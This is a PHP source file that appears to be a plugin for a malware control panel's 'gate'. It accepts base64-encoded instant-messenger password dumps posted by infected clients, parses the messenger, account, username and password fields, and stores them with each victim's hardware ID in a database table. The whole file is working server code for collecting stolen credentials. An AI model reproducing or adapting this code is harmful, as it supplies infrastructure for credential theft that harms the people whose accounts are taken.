<?php
/*
This script is used to receive data from the plugin client! It will be included the gate.php. 
The data that plugin is sending is in the $_POST[] variable. You can use your own methods foreach
communicating with clients but its important to respect user preferances about http/https.
*/
if(!isset($initialized))
{
	include('../../pages/404.php');
}
// HWID is automatically passed as $_POST['hwid'];
if(isset($_POST['data']))
{
	$password_list = explode("---------------------------------------------------------------------------",str_replace(array("*******************************************************
                                       Instant Messengers Password Recovery Report
                                 *******************************************************","_______________________________________________________________________
 Produced by IMPasswordDump from http://www.SecurityXploded.com
"),"",trim(base64_decode($_POST['data'])," \t\n\r\0\x0B")));//Keep in mind that wchar_t on windows is UTF-16LE
	
	$hwid = "N/A";
	
	if(isset($_POST['hwid'])) // HWID will always be set. You can however override it if you set it your self in the .dll when sending a post req
	{
		$hwid = $_POST['hwid']; 
	}
	
	foreach($password_list as $item)
	{
		$messenger = "";
		$account = "";
		$username = "";
		$password = "";
		
		$password_array = explode(PHP_EOL, $item);
		foreach($password_array as $password_data)
		{
			if(strpos($password_data,'Messenger:') !== false) 
			{
				$messenger = str_replace('Messenger:','',$password_data);
			}
			elseif(strpos($password_data,'Account Type:') !== false)
			{
				$account = str_replace('Account Type:','',$password_data);
			}
			elseif(strpos($password_data,'Username:') !== false)
			{
				$username = str_replace('Username:','',$password_data);
			}
			elseif(strpos($password_data,'Password:') !== false)
			{
				$password = str_replace('Password:','',$password_data);
			}
		}
			
		if($messenger != "")
		{
			// Insert query
			$query = "SELECT * FROM im_passwords WHERE messenger = :messenger AND account = :account AND username = :username AND password = :password AND hwid = :hwid"; 
			$query_params = array(':messenger' => $messenger, ':account' => $account, ':username' => $username, ':password' => $password, ':hwid' => $hwid); 
			
			try 
			{ 
				// Execute the query against the database 
				$stmt = $db->prepare($query); 
				$result = $stmt->execute($query_params); 
			} 
			catch(PDOException $ex) 
			{ 
				DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
			} 
			$row = $stmt->fetch();

			// If not found insert it
			if(!$row) 
			{
				$query = "INSERT INTO im_passwords (messenger, account, username, password, hwid) VALUES (:messenger, :account, :username, :password, :hwid)";
				$query_params = array(':messenger' => $messenger, ':account' => $account, ':username' => $username, ':password' => $password, ':hwid' => $hwid); 
			}
			try 
			{ 
				// Execute the query against the database 
				$stmt = $db->prepare($query); 
				$stmt->execute($query_params); 
			} 
			catch(PDOException $ex) 
			{ 
				DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
			} 
		}
	}
	SendResponse("IM stored with success!"); // Not really needed!
}
?>